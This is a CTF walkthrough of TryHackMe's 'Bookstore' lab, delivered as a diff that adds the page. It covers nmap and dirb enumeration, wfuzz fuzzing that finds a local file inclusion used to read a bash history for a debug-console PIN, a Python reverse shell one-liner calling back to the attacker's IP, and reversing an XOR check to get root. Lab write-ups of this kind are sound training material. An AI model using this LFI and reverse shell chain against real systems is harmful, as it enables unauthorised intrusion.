@@ -1,0 +1,148 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
+            <h1 class="post-title entry-title">Bookstore TryHackMe Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/bookstore-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-25T09:41:34+00:00">May 25, 2021</time><time class="updated" datetime="2025-06-24T12:42:53+00:00">June 24, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today it is time to solve another challenge called “Bookstore”. It is available at TryHackMe for penetration testing practice. This challenge is of medium difficulty if you have the right basic knowledge and are attentive to little details that are required in the enumeration process. The credit for making this machine goes to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/p/sidchn">sidchn</a></strong></span>. The breakdown of the Machine with the redacted flags is as follow:</span></p>
+<p><span style="color: #000000;"><strong>Level: Medium</strong></span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating HTTP Service on Port 80</span></li>
+<li><span style="color: #000000;">Reading Source Code</span></li>
+<li><span style="color: #000000;">Enumerating HTTP Service on Port 5000</span></li>
+<li><span style="color: #000000;">Reading Robots.txt</span></li>
+<li><span style="color: #000000;">Reading API Documentation</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using dirb</span></li>
+<li><span style="color: #000000;">API Fuzzing using WFuzz</span></li>
+<li><span style="color: #000000;">Detecting LFI</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation </strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting LFI</span></li>
+<li><span style="color: #000000;">Unlocking Python Console</span></li>
+<li><span style="color: #000000;">Getting Shell as Sid user</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Reverse Engineering Binary using Ghidhra</span></li>
+<li><span style="color: #000000;">Getting Magic Number</span></li>
+<li><span style="color: #000000;">Getting Root Shell</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<p><span style="color: #000000;">There are two flags in this machine to discover. After Booting up the target machine from the <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://tryhackme.com/room/bookstoreoc">TryHackMe: Bookstore CTF Page</a></strong></span>, an IP will be assigned to the machine and will be visible on that page as well.</span></p>
+<p><span style="color: #000000;"><strong>IP Address: 10.10.136.136</strong></span></p>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">We will start a Nmap scan with the -sC for Default Scripts and -sV for Scanning Versions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.10.136.136</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h_KNN_JUWIc/YKzC_O0p1GI/AAAAAAAAwJk/60uGIH3swkM7BMAiZ2xe3s1tJHotEribACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">Nmap was able to identify 2 services running on the target machine. It includes SSH (22) and HTTP (80, 5000). Since we don’t have the credentials for the SSH login, we will begin our enumeration process with the HTTP Service.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since we have 2 HTTP services i.e., 80 and 5000, we will begin enumeration with the default port service. We open the IP Address of the machine into the Web Browser to find a Bookstore-themed Website.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CmqJcBlCQB0/YKzDF1uWAEI/AAAAAAAAwJo/pcFXck7ZMXscRqGxKh82f6wYPk6TCQjKACLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">After enumerating various pages and links on the web application, we got a login panel. Upon reading the source code of the login.html page we see that we have a commented message. It read “Still Working on this page will add the backend support soon, also the debugger pin is inside Sid’s bash history file”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.10.136.136/login.html</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JNRSsTChOJk/YKzDJ2HiZbI/AAAAAAAAwJs/chv-r8xqkv4BRXELatPPPh3W_wunAgvWQCLcBGAsYHQ/s16000/3.png"/></span></p>
+<h4><span style="color: #000000;">API Discovery and Analysis</span></h4>
+<p><span style="color: #000000;">Let’s try to enumerate the other HTTP service that is running on port 5000. We see that it is a Web service running on this port.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LNRV0B9rk8w/YKzDOvCzNSI/AAAAAAAAwJw/VGr4vz2JZiMK8omBsYVbM3_8AJvbs1cqACLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">Back to the Nmap scan, we saw that the service running on this port has a robots.txt page hosted as well. Upon browsing the robots.txt we find the /api page that we can enumerate further.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/robots.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zRw77Bm-_C4/YKzDSuc9JFI/AAAAAAAAwJ4/2TlTiMUlxvYG013OyiKKJTU1nA7ZDIHsQCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Opening /api in our web browser we see that we are provided with the API documentation. This is a list of valid queries that will work on the API. In a real-life penetration testing of an API, this type of documentation is provided to the tester can be able to test the API properly.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/api</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tugbc3kfJrg/YKzDW-m_blI/AAAAAAAAwKA/ogbUi77QyWIVkJREnj3mOq_XoEgatLZ8ACLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">While we are taking a closer look at the API documentation, we can also perform a directory Bruteforce on the HTTP service that is running on port 5000. We used the dirb tool to perform the directory Bruteforce. It revealed a new page that we can take a look at /console.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.136.136:5000</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bkv_rY2NOTE/YKzDb0nEeAI/AAAAAAAAwKI/ViIGvU7qocI1gayHMIrM-RIbDnCsFkOeQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Upon opening the /console, we are greeted with a prompt as shown in the image below. It reads that the console is locked and we need a PIN to get access to the Interactive Console. If we co-relate this information with the commented message that we found on the login.html, we know that the PIN for this console is hidden inside the SID user’s bash history.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/console</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BCCydrwp90A/YKzDf39iEKI/AAAAAAAAwKQ/9rdtKgFV6NMFJzmQxscEwKovPaM1z8TLACLcBGAsYHQ/s16000/8.png"/></span></p>
+<h4><span style="color: #000000;">Exploiting Local File Inclusion</span></h4>
+<p><span style="color: #000000;">In this scenario, we need to be able to read a particular file on the server that is not directly accessible to us. Consequently, a Local File Inclusion Attack would enable us to read the bash history of the SID user that will then help us to unlock the console and proceed further. On the API documentation, we find different URLs. Therefore, we take the one which has a definite entry point to we might be able to inject LFI scripts into it. We take the URL directly from the Documentation and then use the WFuzz on them with adding .bash_history at the end so that if the attack is successful, we know that what parameter is injectable to read the file that we require. However, we see that none of the three parameters are injectable.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wfuzz -u http://10.10.136.136:5000/api/v2/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-20l7LlFiO98/YKzDnXyI8CI/AAAAAAAAwKY/y5R4d8mcRVcf50mfQEoHun11Li_H0zwhQCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">We took a closer look at the API and saw that it is v2. During the Penetration Testing of a Web Service, it is advised to check for all the different possible versions that might still be accessible on the target machine. Since there is a v2, there may be a v1 as well. We try to WFuzz again but this time we replaced the v2 with v1. This revealed the show parameter which seems to be injectable.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wfuzz -u http://10.10.136.136:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rTp6SVCYttw/YKzDs0yEJEI/AAAAAAAAwKc/xoEjgV5OVKgVE2RQEEsQGgmP9siA1gV5gCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We try to browse the .bash_history using the show parameter and we can read the data. We were able to extract the PIN that is required to unlock the Interactive Console. It is 123-321-135.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/api/v1/resources/books?show=.bash_history</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QIgoSAKIHbM/YKzDw9_7REI/AAAAAAAAwKk/I0uz3svPYHkhCfXXzjV1XQsxIthP1qUlACLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Getting back to the console, we enter the PIN and we were able to access the Interactive Console. The message under the Console tells us that we can execute Python expressions. This means we can use the Python Reverse Shell on the console to pop a shell on the target machine. We edit the Python reverse shell to contain our local IP Address [VPN IP Address] and a local port. At the port that was edited in the reverse shellcode, we run a Netcat listener to capture the shell that will be generated.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.10.136.136:5000/console
+123-321-135</pre>
+<p><span style="color: #000000;"><strong>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.207.168”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gyKYs3-XBb8/YKzD2XKwykI/AAAAAAAAwKo/DFkHr3_dnKoOuBCE10xD951Y-Oo933-AgCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p data-start="109" data-end="403"><span style="color: #000000;">As soon as the code is executed on the Interactive Console, we return to the Netcat listener to find a shell on the target machine. Then, we use the Python one-liner to convert the shell into a TTY shell. After the conversion, we observe that the shell we have received belongs to the user Sid.</span></p>
+<p data-start="405" data-end="649" data-is-last-node="" data-is-only-node=""><span style="color: #000000;">Next, we use thels command to list the contents of Sid’s home directory. We successfully find the user.txt flag. Moreover, we also locate a binary that runs as the root user. This, therefore, might be our opportunity to elevate privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ls -la
+cat user.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QKrRS4WR4Tg/YKzD8-sVPUI/AAAAAAAAwKw/LdNIE64UBG00eOE6l7zbzKaWSQ9ByPhSACLcBGAsYHQ/s16000/13.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">To understand the binary, we thought of running it. Upon running it asks the user for a magic number. We entered 123 for testing and it told us that it is incorrect. From this usage, it is quite possible that the binary takes the user input and then matches it with some number or string which helps it identify if it is the correct Magic Number. To find that number that is being matched, we need to reverse engineer the binary. We create an HTTP Server to transfer the binary to Kali Linux for inspection.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./try-harder  
+123
+python3 -m http.server</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WDOYvQgQKVU/YKzEGcDUzHI/AAAAAAAAwK8/XYcCBlJLnNcCAe_l8XGCND_RL3i6bxByACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Since the file is hosted on port 8000 on the target server, we used the wget command to download the binary to our Kali Linux.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget 10.10.136.136:8000/try-harder</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aYl-gW9UJGg/YKzEQbvjhxI/AAAAAAAAwLA/yoUNIDXCgCMa5L2jYYWcbGXaYMqQ83JZgCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We ran a project in Ghidra and loaded the try-harder binary into it. After that, we executed the analysis on the code. Once the analysis was complete, we searched for the main function in the code. As we examined it, we observed that the code had some variables declared. Additionally, we noticed that the binary takes the number entered by the user, inserts it into an XOR function, and then checks if the resulting value is equal to 0x5dcd21f4.</span></p>
+<h5><span style="color: #000000;">XOR function: local_14 = local_1c ^ 0x1116 ^ local_18</span></h5>
+<p><span style="color: #000000;">Where the number entered by the user is local_1c. This is the value that we need to figure out. From the code we know that the value of the other two variables is:</span></p>
+<p><span style="color: #000000;">local_14 = 0x5dcd21f4</span></p>
+<p><span style="color: #000000;">local_18 = 0x5db3</span></p>
+<p><span style="color: #000000;">The good thing about the XOR equation is that you can solve it like any other arithmetic equation.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SfJfep_QJEg/YKzEbPfsGRI/AAAAAAAAwLI/cxIqhxiefkc-18zLp9S-sQ2toRgoj97GgCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We just reconfigured the equation to look like this:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">local_1c = 0x5dcd21f4 ^ 0x1116 ^ 0x5db3</pre>
+<p><span style="color: #000000;">To perform this operation, we opened up and python IDE on our Kali and entered the equation to get the value for the Magic number that we need to provide to the binary. It came out to be: 1573743953</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python
+0x5dcd21f4 ^ 0x1116 ^ 0x5db3</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ePDWQ3hY8XQ/YKzEgqzkcYI/AAAAAAAAwLM/vuRx4MmPAO4bsW9DEWzOsE8JKnf6z6gBQCLcBGAsYHQ/s16000/100.png"/></span></p>
+<p><span style="color: #000000;">We went back to the target machine and ran the binary and this time provided the correct magic number and we were able to get the root shell. We then used the elevated privilege to read the final root flag on the machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./try-harder
+1573743953
+cat /root/root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AzMWhc3sOgg/YKzEkhd8shI/AAAAAAAAwLQ/nfhIu1IcldQ2PmLcHoUIN4iG5tveF2REwCLcBGAsYHQ/s16000/101.png"/></span></p>
+<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/dailybugle-tryhackme-walkthrough/" title="DailyBugle TryHackMe Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">DailyBugle TryHackMe Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/delivery-hackthebox-walkthrough/" rel="prev">Delivery HackTheBox Walkthrough</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/pickle-rick-tryhackme-walkthrough/" rel="next">Pickle Rick TryHackMe Walkthrough</a></div></div>
+	</nav>        </div>
